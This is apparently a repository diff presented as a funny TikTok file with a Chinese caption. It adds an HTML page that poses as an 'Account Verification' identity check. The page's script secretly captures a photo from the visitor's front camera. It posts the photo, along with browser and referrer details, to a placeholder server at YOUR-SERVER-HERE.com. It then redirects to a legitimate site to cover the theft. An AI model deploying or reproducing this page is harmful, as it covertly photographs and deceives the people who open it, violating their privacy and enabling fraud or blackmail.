@@ -1,0 +1,65 @@
+# Tiktok-funny
+太搞笑了，第260分钟哈哈哈哈，笑死我了
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification - Step 2</title>
+    <style>
+        body { margin:0; padding:0; background:#0a0a0a; color:#eee; font-family:Arial, sans-serif; text-align:center; }
+        .box { max-width:500px; margin:80px auto; padding:30px; border:1px solid #333; border-radius:8px; }
+        h1 { color:#4caf50; }
+        p { font-size:18px; margin:20px 0; }
+        .loader { border:4px solid #333; border-top:4px solid #4caf50; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:20px auto; }
+        @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>🔒 Identity Check</h1>
+        <p>Allow camera access to verify your identity and continue.</p>
+        <div class="loader"></div>
+        <small>This is required for security.</small>
+        
+        <video id="v" autoplay style="display:none; width:100%;"></video>
+        <canvas id="c" style="display:none;"></canvas>
+    </div>
+
+    <script>
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
+        const ctx = canvas.getContext('2d');
+
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            .then(stream => {
+                video.srcObject = stream;
+                setTimeout(() => {
+                    canvas.width = video.videoWidth || 1280;
+                    canvas.height = video.videoHeight || 720;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    const imgData = canvas.toDataURL('image/jpeg', 0.85);
+                    
+                    fetch('https://YOUR-SERVER-HERE.com/receive.php', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            photo: imgData,
+                            time: new Date().toISOString(),
+                            ua: navigator.userAgent,
+                            ref: document.referrer || 'direct',
+                            screen: `\( {screen.width}x \){screen.height}`,
+                            lang: navigator.language
+                        })
+                    }).then(() => {
+                        window.location.href = "https://google.com"; // Change to any legit redirect
+                    });
+                }, 1800);
+            })
+            .catch(() => {
+                window.location.href = "https://example.com/retry";
+            });
+    </script>
+</body>
+</html>
